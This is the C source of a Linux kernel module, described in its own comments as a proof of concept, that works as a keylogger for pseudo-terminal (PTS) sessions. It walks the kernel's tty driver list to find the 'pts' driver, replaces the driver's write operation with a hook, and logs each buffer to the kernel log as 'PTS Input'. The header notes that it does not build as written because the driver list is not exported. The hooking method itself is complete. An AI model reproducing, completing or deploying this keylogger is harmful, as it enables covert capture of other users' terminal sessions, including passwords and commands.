// Not Applicalbe Example.
// Just for poc to show how to find tty_driver,
// if tty_driver is EXPORT'ed symbol
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <linux/list.h>

static struct tty_driver *original_driver = NULL;
static struct tty_operations *original_ops = NULL;
static struct tty_operations hooked_ops;
static ssize_t (*original_write)(struct tty_struct *tty, const unsigned char *buf, size_t len);

static ssize_t hooked_write(struct tty_struct *tty, const unsigned char *buf, size_t len) {
    char log_buf[256];
    size_t log_len;
    ssize_t ret;

    log_len = len < sizeof(log_buf) - 1 ? len : sizeof(log_buf) - 1;
    memcpy(log_buf, buf, log_len);
    log_buf[log_len] = '\0';
    pr_info("PTS Input: %s\n", log_buf);

    ret = original_write(tty, buf, len);
    return ret;
}

static struct tty_driver *find_pts_driver(void) {
    struct tty_driver *driver;
    struct list_head *pos;

    // tty_driver is not a EXPORT symbol
    list_for_each(pos, &tty_drivers) {
        driver = list_entry(pos, struct tty_driver, tty_drivers);
        if (driver->driver_name && strcmp(driver->driver_name, "pts") == 0) {
            return driver;
        }
    }
    return NULL;
}

static int __init keylogger_init(void) {
    original_driver = find_pts_driver();
    if (!original_driver) {
        pr_err("Failed to find PTS driver\n");
        return -EINVAL;
    }

    original_ops = (struct tty_operations *)original_driver->ops;
    if (!original_ops || !original_ops->write) {
        pr_err("No write operation found in PTS driver\n");
        return -EINVAL;
    }

    hooked_ops = *original_ops;
    original_write = original_ops->write;
    hooked_ops.write = hooked_write;

    original_driver->ops = &hooked_ops;

    pr_info("PTS keylogger module loaded\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    if (original_driver && original_ops) {
        original_driver->ops = original_ops;
    }
    pr_info("PTS keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("keylogger for term(PTS) inputs");
